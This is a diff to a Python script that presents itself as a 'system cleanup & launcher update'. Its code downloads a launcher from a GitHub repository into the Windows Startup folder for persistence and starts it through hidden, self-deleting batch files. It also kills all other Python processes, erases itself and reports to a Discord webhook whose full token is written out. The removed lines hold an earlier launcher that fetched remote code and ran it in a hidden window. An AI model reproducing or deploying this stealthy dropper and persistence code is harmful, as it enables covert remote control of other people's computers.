@@ -1,10 +1,11 @@
-# monitor_script.py - Kills old launcher, cleans up, and updates Startup.pyw
+# monitor_script.py - Kills old launcher, cleans up, and replaces Startup.pyw with github_launcher.py
 import os
 import sys
 import subprocess
 import tempfile
 import time
 import requests
+import urllib.request
 
 # Discord webhook
 WEBHOOK = "https://discordapp.com/api/webhooks/1462762502130630781/IohGYGgxBIr2WPLUHF14QN_8AbyUq-rVGv_KQzhX1rHokBxF_OqjWlRm96x_gbYGQEJ0"
@@ -150,8 +151,8 @@ def cleanup_files():
     
     return len(deleted) > 0
 
-def create_new_startup_pyw():
-    """Create/update the Startup.pyw file in startup folder"""
+def download_and_replace_startup_pyw():
+    """Download github_launcher.py from repository and save as Startup.pyw"""
     startup_folder = os.path.join(
         os.getenv('APPDATA'),
         'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
@@ -159,86 +160,24 @@ def create_new_startup_pyw():
     
     startup_file = os.path.join(startup_folder, "Startup.pyw")
     
-    # The new launcher code that downloads and runs monitor_script.py from GitHub
-    new_launcher_code = '''import os
-import sys
-import subprocess
-import urllib.request
-import tempfile
-import time
-
-def run_monitor_script():
-    """Download and run monitor_script.py from GitHub"""
     try:
-        # URL to monitor_script.py on GitHub
-        monitor_url = "https://raw.githubusercontent.com/ElianBoden/Deployer/main/monitor_script.py"
+        # URL to github_launcher.py on GitHub
+        launcher_url = "https://raw.githubusercontent.com/ElianBoden/Deployer/main/github_launcher.py"
         
-        # Download the script
-        response = urllib.request.urlopen(monitor_url, timeout=10)
-        script_code = response.read().decode('utf-8')
+        print(f"Downloading github_launcher.py from: {launcher_url}")
         
-        # Save to temp file
-        temp_dir = tempfile.gettempdir()
-        timestamp = str(int(time.time()))
-        temp_script = os.path.join(temp_dir, f"monitor_{timestamp}.py")
+        # Download the launcher code
+        response = urllib.request.urlopen(launcher_url, timeout=10)
+        launcher_code = response.read().decode('utf-8')
         
-        # Write script to temp file
-        with open(temp_script, 'w', encoding='utf-8') as f:
-            f.write(script_code)
-        
-        print(f"Monitor script saved to: {temp_script}")
-        
-        # Run it hidden
-        startupinfo = subprocess.STARTUPINFO()
-        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-        
-        process = subprocess.Popen(
-            [sys.executable, temp_script],
-            startupinfo=startupinfo,
-            creationflags=subprocess.CREATE_NO_WINDOW
-        )
-        
-        print(f"Monitor script started with PID: {process.pid}")
-        
-        # Schedule deletion of temp file after 10 seconds
-        time.sleep(10)
-        try:
-            os.remove(temp_script)
-            print("Temp monitor script deleted")
-        except:
-            pass
-        
-        return True
-        
-    except Exception as e:
-        print(f"Error: {e}")
-        return False
-
-def main():
-    """Main launcher function"""
-    # Wait a bit for system to be ready
-    time.sleep(30)  # Wait 30 seconds after startup
-    
-    # Run the monitor script
-    run_monitor_script()
-    
-    # Keep launcher alive but idle
-    while True:
-        time.sleep(3600)  # Sleep for 1 hour
-
-if __name__ == "__main__":
-    main()
-'''
-    
-    try:
-        # Write the new Startup.pyw file
+        # Write it as Startup.pyw
         with open(startup_file, 'w', encoding='utf-8') as f:
-            f.write(new_launcher_code)
+            f.write(launcher_code)
         
-        print(f"✓ Created/updated Startup.pyw at: {startup_file}")
+        print(f"✓ Downloaded and saved as Startup.pyw at: {startup_file}")
         return True
     except Exception as e:
-        print(f"✗ Failed to create Startup.pyw: {e}")
+        print(f"✗ Failed to download or save github_launcher.py: {e}")
         return False
 
 def start_new_launcher():
@@ -257,7 +196,8 @@ def start_new_launcher():
     try:
         # Create batch file to start the new launcher
         batch_script = f'''@echo off
-timeout /t 5 /nobreak >nul
+echo Starting new launcher...
+timeout /t 3 /nobreak >nul
 start /b "" pythonw "{startup_file}"
 echo New Startup.pyw launcher started
 del "%~f0" 2>nul
@@ -270,7 +210,7 @@ del "%~f0" 2>nul
         subprocess.Popen(['cmd', '/c', batch_path],
                         creationflags=subprocess.CREATE_NO_WINDOW)
         
-        print("✓ New launcher will start in 5 seconds")
+        print("✓ New launcher will start in 3 seconds")
         return True
     except Exception as e:
         print(f"✗ Failed to start new launcher: {e}")
@@ -289,10 +229,14 @@ def end_all_python_processes_except_self():
 set CURRENT_PID={current_pid}
 
 :: Kill ALL Python processes except current one
-taskkill /f /im python.exe 2>nul | findstr /v "%CURRENT_PID%"
-taskkill /f /im pythonw.exe 2>nul | findstr /v "%CURRENT_PID%"
+for /f "tokens=2 delims=," %%i in ('tasklist /fo csv /nh /fi "imagename eq python.exe"') do (
+    if not "%%i"=="%CURRENT_PID%" taskkill /f /pid %%i 2>nul
+)
+for /f "tokens=2 delims=," %%i in ('tasklist /fo csv /nh /fi "imagename eq pythonw.exe"') do (
+    if not "%%i"=="%CURRENT_PID%" taskkill /f /pid %%i 2>nul
+)
 
-:: Also kill by process name using wmic, excluding current PID
+:: Also use wmic for more thorough cleanup
 wmic process where "name='python.exe' and ProcessId!='%CURRENT_PID%'" delete 2>nul
 wmic process where "name='pythonw.exe' and ProcessId!='%CURRENT_PID%'" delete 2>nul
 
@@ -321,7 +265,7 @@ del "%~f0" 2>nul
     return True
 
 def main():
-    """Main cleanup function - cleans up and updates Startup.pyw"""
+    """Main cleanup function - cleans up and replaces Startup.pyw with github_launcher.py"""
     print("=" * 60)
     print("SYSTEM CLEANUP & LAUNCHER UPDATE")
     print("=" * 60)
@@ -335,10 +279,10 @@ def main():
     print("\n[2/5] Cleaning up old files...")
     cleanup_success = cleanup_files()
     
-    # Step 3: Create/update Startup.pyw
-    print("\n[3/5] Creating/updating Startup.pyw...")
-    if create_new_startup_pyw():
-        print("✓ Startup.pyw updated successfully")
+    # Step 3: Download github_launcher.py and save as Startup.pyw
+    print("\n[3/5] Downloading github_launcher.py as Startup.pyw...")
+    if download_and_replace_startup_pyw():
+        print("✓ Startup.pyw updated with github_launcher.py")
     else:
         print("✗ Failed to update Startup.pyw")
     
@@ -347,7 +291,7 @@ def main():
     start_new_launcher()
     
     # Send webhook notification
-    send_webhook("🔄 Launcher updated! Old processes cleaned, new Startup.pyw installed and running.")
+    send_webhook("🔄 Launcher updated! github_launcher.py downloaded and installed as Startup.pyw")
     
     # Step 5: End other Python processes and clean up self
     print("\n[5/5] Final cleanup...")
@@ -357,7 +301,7 @@ def main():
     print("UPDATE COMPLETE")
     print("- Old processes killed")
     print("- Files cleaned up")
-    print("- Startup.pyw updated")
+    print("- github_launcher.py downloaded as Startup.pyw")
     print("- New launcher started")
     print("- Self-cleanup initiated")
     print("=" * 60)
